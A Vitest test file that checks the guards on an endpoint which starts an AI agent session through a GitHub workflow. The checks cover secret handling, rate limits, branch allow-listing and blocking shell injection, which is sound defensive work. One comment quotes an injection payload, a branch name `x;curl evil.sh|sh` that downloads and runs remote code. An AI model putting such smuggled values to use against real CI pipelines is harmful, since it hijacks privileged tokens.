import { readFileSync } from 'node:fs';
import { beforeEach, describe, expect, it } from 'vitest';

/**
 * **The guards on the one thing in this project that can act.**
 *
 * Phase 2 slice three. Everything else the site serves is read-only by
 * construction; `/api/instruct` starts a real session on the owner's
 * instruction. These assertions are source-level because neither the function
 * nor the workflow can be executed here — the container's egress policy blocks
 * GitHub and no credential exists in this environment, by design. A check that
 * reads the source is weaker than one that runs it, and it is what there is; it
 * is recorded as the weaker thing rather than dressed as the stronger one.
 */

const FUNCTION = readFileSync(
  new URL('../../../netlify/functions/instruct.mjs', import.meta.url),
  'utf8',
);
const WORKFLOW = readFileSync(
  new URL('../../../.github/workflows/instruct.yml', import.meta.url),
  'utf8',
);
const NETLIFY = readFileSync(new URL('../../../netlify.toml', import.meta.url), 'utf8');

describe('the endpoint that can start work', () => {
  it('takes a POST and refuses anything else', () => {
    expect(FUNCTION).toContain("request.method !== 'POST'");
  });

  it('refuses when no secret is installed, rather than defaulting to open', () => {
    expect(FUNCTION).toContain('if (!secret) return refuse(');
    expect(FUNCTION).toContain('if (!token) return refuse(');
  });

  it('requires the shared secret on every request', () => {
    expect(FUNCTION).toContain("request.headers.get('x-virgil-secret')");
    expect(FUNCTION).toContain('secretMatches');
  });

  it('compares the secret without leaking its length through an early return', () => {
    // The comparison walks the whole string once the lengths match, rather than
    // stopping at the first difference.
    expect(FUNCTION).toContain('difference |= given.charCodeAt(i) ^ expected.charCodeAt(i);');
  });

  it('refuses the default branch, by name and by asking GitHub which it is', () => {
    expect(FUNCTION).toContain('repository.default_branch');
    expect(FUNCTION).toContain("branch === 'main'");
    expect(FUNCTION).toContain("branch === 'master'");
  });

  it('runs one at a time', () => {
    expect(FUNCTION).toContain("run.status === 'queued' || run.status === 'in_progress'");
  });

  it('has a ceiling on runs in a day', () => {
    expect(FUNCTION).toMatch(/const MAX_PER_DAY = \d+;/);
    expect(FUNCTION).toContain('today >= MAX_PER_DAY');
  });

  it('bounds the length of an instruction', () => {
    expect(FUNCTION).toMatch(/const MAX_INSTRUCTION = \d+;/);
  });

  /**
   * **What is scanned is what is sent.**
   *
   * This banned four substrings anywhere in the file, which made it a check on
   * the endpoint's vocabulary rather than on its requests. It went red when the
   * attempt limiter called `attempts.delete(address)` — a `Map`, in this
   * process's memory, nowhere near GitHub — and the only ways to make a
   * whole-file word scan pass are to rename local code around it or to delete
   * the check. Both teach the wrong thing.
   *
   * So it reads what actually reaches `gh(`, which is the single door to the
   * GitHub API in this file, and every HTTP method the file uses. That is
   * strictly stronger: a path built for `/merge` now fails even if the word is
   * spelled some other way in the source, and a `DELETE` fails wherever it is
   * issued from.
   */
  it('asks GitHub for nothing it does not need, and asks for no merge', () => {
    const paths = [...FUNCTION.matchAll(/\bgh\(\s*`([^`]*)`/g)].map((m) => m[1] ?? '');
    expect(paths.length, 'no GitHub request paths were found to check').toBeGreaterThan(2);
    for (const path of paths) {
      for (const forbidden of ['/merge', 'pulls', 'deployments', 'issues', 'releases']) {
        expect(path.includes(forbidden), `${path} asks for ${forbidden}`).toBe(false);
      }
    }
    const methods = [...FUNCTION.matchAll(/method:\s*'([A-Z]+)'/g)].map((m) => m[1] ?? '');
    // POST is the dispatch. Anything that removes or replaces is not this
    // endpoint's business.
    for (const method of methods) {
      expect(['POST'], `the file issues a ${method}`).toContain(method);
    }
    // And the workflow it is allowed to start is still the only one it names.
    expect(FUNCTION).toContain("const WORKFLOW = 'instruct.yml';");
  });

  it('is routed on its own, above the catch-all', () => {
    expect(NETLIFY).toContain('from = "/api/instruct"');
    expect(NETLIFY.indexOf('from = "/api/instruct"')).toBeLessThan(NETLIFY.indexOf('from = "/*"'));
  });
});

/**
 * **The two findings that were about what an input can reach — KP2-06 and
 * KP2-07.**
 *
 * Both were open across three Keeper reviews, and both are the same species:
 * a value that arrives from outside is treated as trustworthy at the one point
 * where it stops being data and becomes instruction. One was the branch name
 * reaching a shell; the other was a limit that switched itself off when it
 * could not be checked.
 */
describe('nothing an input carries reaches a command', () => {
  /** Every `run:` block in the workflow, with the line numbers they start at. */
  const runBlocks = (): { at: number; body: string }[] => {
    const lines = WORKFLOW.split('\n');
    const out: { at: number; body: string }[] = [];
    let indent = -1;
    let body: string[] = [];
    let at = 0;
    for (const [index, line] of lines.entries()) {
      const opens = /^(\s*)run: \|/.exec(line);
      if (opens) {
        if (indent >= 0) out.push({ at, body: body.join('\n') });
        indent = (opens[1] ?? '').length;
        body = [];
        at = index + 1;
        continue;
      }
      if (indent < 0) continue;
      const isOutdent = line.trim() !== '' && line.length - line.trimStart().length <= indent;
      if (isOutdent) {
        out.push({ at, body: body.join('\n') });
        indent = -1;
        body = [];
        continue;
      }
      body.push(line);
    }
    if (indent >= 0) out.push({ at, body: body.join('\n') });
    return out;
  };

  it('has run blocks to check, so this is not passing over an empty list', () => {
    expect(runBlocks().length).toBeGreaterThan(4);
  });

  /**
   * **KP2-06.** `${{ inputs.branch }}` was pasted into three `git push` lines
   * and into the middle of a `node -e` string literal. A branch named
   * `x;curl evil.sh|sh` ran a command; one containing a quote closed the JSON
   * string and wrote its own script, which this workflow then executed holding a
   * token that can write to the repository.
   *
   * The rule is not "sanitise the branch". It is that **no expansion happens in
   * a command at all**: every value arrives through `env:`, where the runner
   * puts it in the environment instead of pasting it into the text of a script.
   */
  it('expands no workflow expression inside any run block', () => {
    for (const block of runBlocks()) {
      expect(
        block.body,
        `an expression is expanded in the run block at line ${block.at}`,
      ).not.toContain('${{');
    }
  });

  /**
   * **KP5-06.** The rule that no `${{ }}` reaches a command is only half the
   * property. The other half is that every `$VAR` a command *uses* is declared
   * in that step's `env:` — and one step was not, so the note it writes into the
   * room would have read "Run ." The check that caught the first half could not
   * see the second.
   */
  it('declares every variable its commands use', () => {
    const steps = WORKFLOW.split(/\n      - (?=name:|uses:)/).slice(1);
    expect(steps.length).toBeGreaterThan(5);
    for (const step of steps) {
      const runAt = step.indexOf('run: |');
      if (runAt === -1) continue;
      const name = /name: (.+)/.exec(step)?.[1] ?? '(unnamed)';
      const body = step.slice(runAt);
      const declared = new Set(
        [...step.slice(0, runAt).matchAll(/^\s{10}([A-Z_][A-Z0-9_]*):/gm)].map((m) => m[1] ?? ''),
      );
      // Shell variables the step's own script sets, and the ones the runner
      // always provides, are not the step's to declare.
      const provided = new Set(['GITHUB_ENV', 'GITHUB_OUTPUT', 'HOME', 'PATH', 'RUNNER_TEMP']);
      const used = new Set(
        [...body.matchAll(/\$\{?([A-Z_][A-Z0-9_]*)\}?/g)].map((m) => m[1] ?? ''),
      );
      for (const variable of used) {
        if (provided.has(variable)) continue;
        expect(
          declared.has(variable),
          `step "${name}" uses $${variable} and does not declare it in env:`,
        ).toBe(true);
      }
    }
  });

  it('passes the branch through the environment, quoted, wherever it pushes', () => {
    expect(WORKFLOW).not.toMatch(/git push origin HEAD:\$\{\{/);
    const pushes = [...WORKFLOW.matchAll(/git push origin (\S+)/g)].map((m) => m[1] ?? '');
    expect(pushes.length).toBeGreaterThan(2);
    for (const target of pushes) expect(target).toBe('"HEAD:$TARGET"');
  });

  /**
   * The gate that makes the environment variable safe to use even where a shell
   * would still expand it. An allow-list: what a branch name needs, and no other
   * byte. The deny-list it replaced named three shapes and let every other one
   * through, which is the way a deny-list always fails — on the character nobody
   * listed.
   */
  it('admits only branch names it can name the shape of', () => {
    expect(WORKFLOW).toContain("grep -qE '^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$'");
    expect(WORKFLOW).toContain('exit 1');
    // And still refuses the default branch first, before this or anything else.
    const refusal = WORKFLOW.indexOf('Refuse the default branch');
    const checkout = WORKFLOW.indexOf('actions/checkout');
    expect(refusal).toBeGreaterThan(-1);
    expect(refusal).toBeLessThan(checkout);
  });

  /**
   * **KP2-07.** The runs query answered both limits — one at a time, and the
   * daily ceiling — and fell to an empty list when it failed. So a GitHub error
   * or an expired token did not weaken the limits, it removed them, and the
   * endpoint looked exactly as it does when nothing has run yet.
   */
  it('refuses to start work when it cannot read what is already running', () => {
    expect(FUNCTION).not.toMatch(/workflow_runs\?per_page=100`,\s*token,\s*\)\.catch/);
    expect(FUNCTION).toContain("throw new Error('the runs query returned no list of runs')");
    // The refusal, and the status that says "try again" rather than "you are
    // out of runs" — they are different instructions to the owner.
    expect(FUNCTION).toContain('so nothing was started');
    expect(FUNCTION).toContain('503');
  });

  it('counts both limits from the list it refused to do without', () => {
    // The guard is only worth having if the limits are still downstream of it.
    const guard = FUNCTION.indexOf('a limit that cannot be counted has not been met');
    const inFlight = FUNCTION.indexOf("'A session is already working. One at a time.'");
    const ceiling = FUNCTION.indexOf('which is the ceiling');
    expect(guard).toBeGreaterThan(-1);
    expect(inFlight).toBeGreaterThan(guard);
    expect(ceiling).toBeGreaterThan(guard);
  });
});

/**
 * **KP2-12: an acceptance criterion of the brief, unmet and not retired.**
 *
 * `PHASE_2_SLICE_3_BRIEF.md` — *"slice three is not finished until the page
 * tells him a run costs something before he starts it"*. There was no cost text.
 * A layer-4 criterion is not a session's to retire, so it is met instead, and
 * this holds it met: the sentence beneath the Send button has to name a cost.
 */
describe('the composer says what a run costs before it is started', () => {
  const SESSION = readFileSync(
    new URL('../src/world/live/liveSession.ts', import.meta.url),
    'utf8',
  );

  it('names both the metered minute and the charged run', () => {
    const note = /LIVE_COMPOSER_NOTE =\s*\n?\s*'([^']+)'/.exec(SESSION)?.[1] ?? '';
    expect(note.length).toBeGreaterThan(0);
    expect(note).toMatch(/Actions minutes/);
    expect(note).toMatch(/charged/);
    // And still says what it does, which was the sentence's first job.
    expect(note).toMatch(/cannot merge, deploy, or touch the default branch/);
  });

  it('is the sentence the composer actually shows when it can send', () => {
    const window = readFileSync(
      new URL('../src/world/window/AgentWindow.tsx', import.meta.url),
      'utf8',
    );
    expect(window).toContain('canInstruct() ? LIVE_COMPOSER_NOTE : COMPOSER_NOTE');
  });
});

describe('the workflow that does the work', () => {
  /**
   * **KP2-17, the trigger half.** The list named four triggers and GitHub has
   * more; `repository_dispatch:` in particular lets anything holding a token
   * start this workflow over the API, which is the one trigger that most defeats
   * the sentence *"starts only when the owner starts it"*. Naming a few and
   * calling the set closed is how a deny-list always fails, so this reads what
   * the `on:` block actually contains and requires it to be one key.
   */
  it('starts only when the owner starts it', () => {
    expect(WORKFLOW).toContain('workflow_dispatch:');
    const onAt = WORKFLOW.search(/^on:$/m);
    expect(onAt).toBeGreaterThan(-1);
    const after = WORKFLOW.slice(onAt + 3);
    const endsAt = after.search(/^\S/m);
    const block = endsAt === -1 ? after : after.slice(0, endsAt);
    const triggers = [...block.matchAll(/^ {2}([a-z_]+):/gm)].map((m) => m[1] ?? '');
    expect(triggers).toEqual(['workflow_dispatch']);
  });

  it('refuses the default branch before anything is checked out', () => {
    const refusal = WORKFLOW.indexOf('Refuse the default branch');
    const checkout = WORKFLOW.indexOf('actions/checkout');
    expect(refusal).toBeGreaterThan(-1);
    expect(refusal).toBeLessThan(checkout);
    expect(WORKFLOW).toContain('github.event.repository.default_branch');
  });

  /**
   * **KP2-17, the permissions half.** The old assertion listed four scopes that
   * must be absent — and would have passed `permissions: write-all`, which
   * grants every one of them and more in six characters. Again a deny-list where
   * the property is a whitelist: the block must grant `contents: write` and
   * nothing else at all, so it is read and every key in it is checked.
   */
  it('is granted contents and nothing else', () => {
    const at = WORKFLOW.indexOf('permissions:');
    expect(at).toBeGreaterThan(-1);
    const after = WORKFLOW.slice(at + 'permissions:'.length);
    // The block runs to the next line at column zero. (First written as
    // `/\n {0,2}\S/`, which matched the block's own first entry and made it
    // empty — a test that passed nothing and would have reported no grants at
    // all as compliant.)
    const endsAt = after.search(/\n\S/);
    const block = endsAt === -1 ? after : after.slice(0, endsAt);
    const granted = [...block.matchAll(/^\s*([a-z-]+):\s*(\S+)/gm)].map((m) => `${m[1]}: ${m[2]}`);
    expect(granted).toEqual(['contents: write']);
    // And the shorthand that grants everything at once, which the list of
    // forbidden scopes could never have caught.
    expect(WORKFLOW).not.toMatch(/permissions:\s*(write-all|read-all)/);
  });

  it('writes the instruction down before acting on it', () => {
    const record = WORKFLOW.indexOf('Record the instruction');
    const act = WORKFLOW.indexOf('Work on the instruction');
    expect(record).toBeGreaterThan(-1);
    expect(record).toBeLessThan(act);
  });

  it('tells the room a session started before the work, and stopped after it', () => {
    expect(WORKFLOW).toContain('Say that a session has started');
    expect(WORKFLOW).toContain('Say that the session has stopped');
    // Whatever happened, including a failure: a run that ends leaving a
    // Fabricator lit is the failure the shelf life exists for.
    const stopped = WORKFLOW.slice(WORKFLOW.indexOf('Say that the session has stopped'));
    expect(stopped).toContain('if: always()');
  });

  it('prefers the subscription token, which carries no per-run charge', () => {
    expect(WORKFLOW).toContain('CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}');
    expect(WORKFLOW).toContain('if [ -n "$CLAUDE_CODE_OAUTH_TOKEN" ]; then');
    // And it says which one it used, because one of them costs money per run
    // and the owner should never have to guess which he is spending.
    expect(WORKFLOW).toContain('No per-run charge');
    expect(WORKFLOW).toContain('This run is charged');
  });

  it('stops rather than pretending when no credential is installed', () => {
    expect(WORKFLOW).toContain('no credential is installed, so no agent can run');
    expect(WORKFLOW).toContain(
      'the instruction is recorded and committed; nothing else has happened',
    );
  });

  it('never merges, deploys or opens a pull request', () => {
    // **Comments are stripped first, and that is not a loophole.** Half this
    // workflow's prose is about what it refuses to do, and a scan that banned
    // the words would fail on the sentences promising not to use them — which
    // would teach the next person to delete the explanation rather than the
    // capability. What is scanned is what runs.
    const runs = WORKFLOW.split('\n')
      .filter((line) => !line.trim().startsWith('#'))
      .join('\n')
      .toLowerCase();
    for (const forbidden of ['gh pr ', 'pull_request', 'git merge', 'deploy']) {
      expect(runs.includes(forbidden), forbidden).toBe(false);
    }
  });
});

/**
 * **Slice six: the owner's question and Virgil's reply both survive the run.**
 *
 * `docs/process/PHASE_2_SLICE_6_BRIEF.md` states the property these hold:
 *
 * > "A run that dies still leaves the question and the reason, because a message
 * > that disappears is worse than a message that fails."
 *
 * The writing is done by the workflow rather than by the agent, for the reason
 * slice two's shelf life exists: a guarantee that depends on a session
 * remembering is not a guarantee. So what is checked here is the ordering and
 * the conditions, which is the whole of it — `conversation-writer.test.ts`
 * checks what the script does once it is called.
 */
describe('the owner gets an answer, or is told why he did not', () => {
  const stepsOf = () => WORKFLOW.split(/\n      - (?=name:|uses:)/).slice(1);
  const named = (part: string) => {
    const step = stepsOf().find((s) => s.startsWith(`name: ${part}`));
    expect(step, `there is no step named "${part}"`).toBeDefined();
    return step as string;
  };
  const positionOf = (part: string) => stepsOf().findIndex((s) => s.startsWith(`name: ${part}`));

  it('writes the question down before the agent that answers it starts', () => {
    // Not after. A run that dies during install must still leave the message in
    // the thread, because the owner typed it and is waiting for it.
    const question = positionOf('Write the question into the conversation');
    const agent = positionOf('Work on the instruction');
    expect(question).toBeGreaterThan(-1);
    expect(agent).toBeGreaterThan(question);
  });

  it('commits the question before running the agent, rather than only in memory', () => {
    // The container is thrown away. A file written and not pushed is a message
    // that never existed.
    expect(positionOf('Commit the instruction and the status')).toBeGreaterThan(
      positionOf('Write the question into the conversation'),
    );
    expect(positionOf('Work on the instruction')).toBeGreaterThan(
      positionOf('Commit the instruction and the status'),
    );
  });

  it('writes the reply whatever happened to the run', () => {
    const step = named('Write what the session said, or why it did not');
    expect(step).toContain('if: always()');
    // Both outcomes, from one step. Two steps with opposite conditions is the
    // shape where a third outcome — cancelled, or a step that never ran — falls
    // between them and leaves the thread silent.
    expect(step).toContain('--answer');
    expect(step).toContain('--fail');
  });

  it('is pushed, so the reply reaches the owner rather than the container', () => {
    expect(positionOf('Commit whatever the session changed')).toBeGreaterThan(
      positionOf('Write what the session said, or why it did not'),
    );
  });

  it('keeps what the agent said rather than only printing it', () => {
    const step = named('Work on the instruction');
    expect(step).toContain('ANSWER_FILE');
    expect(step).toContain('tee "$ANSWER_FILE"');
  });

  it('does not let a succeeding tee hide a failing agent', () => {
    // Without `pipefail` the exit status is `tee`'s, which is always zero. The
    // step would report success, the reply step would take the answered branch,
    // and a run that died would be drawn as Virgil replying.
    expect(named('Work on the instruction')).toContain('set -o pipefail');
  });

  it('judges the run by what the agent step did, not by what it was recoloured to', () => {
    const step = named('Write what the session said, or why it did not');
    expect(step).toContain('steps.agent.outcome');
    expect(step).not.toContain('steps.agent.conclusion');
  });

  it('holds the answer outside the checkout, so it is never committed as a stray file', () => {
    // `git add -A` runs after this. An answer file inside the repository would
    // be committed to the owner's branch as well as written into the thread.
    expect(named('Work on the instruction')).toContain('ANSWER_FILE: ${{ runner.temp }}');
  });

  it("passes the owner's words through the environment here too", () => {
    for (const part of [
      'Write the question into the conversation',
      'Write what the session said, or why it did not',
    ]) {
      expect(named(part)).toContain('VIRGIL_QUESTION: ${{ inputs.instruction }}');
    }
  });
});

/**
 * **Slice six's precondition, and the first checks in this project that run the
 * endpoint rather than read it.**
 *
 * The system audit's `SA-S-02`: there was no limit of any kind on wrong guesses
 * at `INSTRUCT_SECRET`, and a landed guess reaches a session running
 * `--dangerously-skip-permissions` with the owner's Claude subscription token in
 * scope. `docs/process/PHASE_2_SLICE_6_BRIEF.md` makes the fix a precondition of
 * switching the composer on, not a recommendation.
 *
 * Everything above is source-level because GitHub is unreachable here. **These
 * are not.** Every refusal below happens before any network call — that is the
 * whole point of checking the limit before the comparison — so the handler can
 * be driven for real, and is. `KP9-04` records that the sibling endpoint's
 * handler is invoked by no test; this is what closing that looks like.
 */
describe('a wrong guess at the secret costs something', () => {
  const SECRET = 'a-secret-long-enough-to-be-a-secret';

  const post = async (headers: Record<string, string>) => {
    const { default: handler, forgetAttempts } = (await import(
      '../../../netlify/functions/instruct.mjs'
      // Deliberately outside this app's TypeScript program, like `state.mjs`.
    )) as { default: (request: Request) => Promise<Response>; forgetAttempts: () => void };
    void forgetAttempts;
    return handler(
      new Request('https://example.test/api/instruct', {
        method: 'POST',
        headers,
        body: JSON.stringify({ instruction: 'what is the state of things?' }),
      }),
    );
  };

  const clear = async () => {
    const { forgetAttempts } = (await import('../../../netlify/functions/instruct.mjs')) as {
      forgetAttempts: () => void;
    };
    forgetAttempts();
  };

  beforeEach(async () => {
    process.env.INSTRUCT_SECRET = SECRET;
    process.env.GITHUB_DISPATCH_TOKEN = 'not-a-real-token';
    process.env.GITHUB_REPO = 'owner/repo';
    process.env.GITHUB_BRANCH = 'claude/some-branch';
    await clear();
  });

  it('refuses a wrong secret without saying anything about it', async () => {
    const response = await post({ 'x-virgil-secret': 'wrong', 'x-nf-client-connection-ip': '1.1.1.1' });
    expect(response.status).toBe(401);
    const body = (await response.json()) as { reason: string };
    // Not "wrong secret", not "3 attempts left", not "no secret installed".
    expect(body.reason).toBe('Refused.');
  });

  it('stops looking at guesses from an address that has spent its attempts', async () => {
    const from = { 'x-virgil-secret': 'wrong', 'x-nf-client-connection-ip': '2.2.2.2' };
    for (let i = 0; i < 5; i += 1) expect((await post(from)).status).toBe(401);
    const sixth = await post(from);
    expect(sixth.status).toBe(429);
  });

  it('refuses the locked-out address even when it then guesses correctly', async () => {
    // The limit is checked before the comparison. Checking after it would let an
    // attacker keep testing and merely change what they are told.
    const from = '3.3.3.3';
    for (let i = 0; i < 5; i += 1) {
      await post({ 'x-virgil-secret': 'wrong', 'x-nf-client-connection-ip': from });
    }
    const right = await post({ 'x-virgil-secret': SECRET, 'x-nf-client-connection-ip': from });
    expect(right.status).toBe(429);
  });

  it('counts a missing header as the wrong guess it is', async () => {
    const from = { 'x-nf-client-connection-ip': '4.4.4.4' };
    for (let i = 0; i < 5; i += 1) expect((await post(from)).status).toBe(401);
    expect((await post(from)).status).toBe(429);
  });

  it('does not lock out everyone because one address guessed', async () => {
    const guesser = { 'x-virgil-secret': 'wrong', 'x-nf-client-connection-ip': '5.5.5.5' };
    for (let i = 0; i < 6; i += 1) await post(guesser);
    const someoneElse = await post({
      'x-virgil-secret': 'wrong',
      'x-nf-client-connection-ip': '6.6.6.6',
    });
    expect(someoneElse.status).toBe(401);
  });

  it('counts a request it cannot attribute, rather than waving it through', async () => {
    // KP2-07's rule one endpoint over: a limit that cannot be attributed has not
    // been satisfied. The version that returns null for "unknown" is the version
    // where sending no headers is the way around it.
    for (let i = 0; i < 5; i += 1) {
      expect((await post({ 'x-virgil-secret': 'wrong' })).status).toBe(401);
    }
    expect((await post({ 'x-virgil-secret': 'wrong' })).status).toBe(429);
  });

  it('trusts the connection address over one the client can write', async () => {
    // `x-forwarded-for` is client-settable. If it were preferred, an attacker
    // would get a fresh allowance per forged header and the limit would be
    // decoration.
    const connection = '7.7.7.7';
    for (let i = 0; i < 5; i += 1) {
      await post({
        'x-virgil-secret': 'wrong',
        'x-nf-client-connection-ip': connection,
        'x-forwarded-for': `9.9.9.${i}`,
      });
    }
    const next = await post({
      'x-virgil-secret': 'wrong',
      'x-nf-client-connection-ip': connection,
      'x-forwarded-for': '9.9.9.99',
    });
    expect(next.status).toBe(429);
  });

  it('forgets an address once it gets the secret right', async () => {
    const from = '8.8.8.8';
    for (let i = 0; i < 4; i += 1) {
      await post({ 'x-virgil-secret': 'wrong', 'x-nf-client-connection-ip': from });
    }
    // The correct secret goes on to talk to GitHub, which is unreachable here —
    // so this asserts only that it was not refused by the limit.
    const right = await post({ 'x-virgil-secret': SECRET, 'x-nf-client-connection-ip': from });
    expect(right.status).not.toBe(429);
    expect(right.status).not.toBe(401);

    for (let i = 0; i < 5; i += 1) {
      expect((await post({ 'x-virgil-secret': 'wrong', 'x-nf-client-connection-ip': from })).status)
        .toBe(401);
    }
  });

  it('still refuses everything when no secret is installed', async () => {
    // Absent configuration is a closed door. Checked here by running it, where
    // before it was a line of source read by a check.
    process.env.INSTRUCT_SECRET = '';
    const response = await post({ 'x-virgil-secret': 'anything' });
    expect(response.status).toBe(503);
  });
});
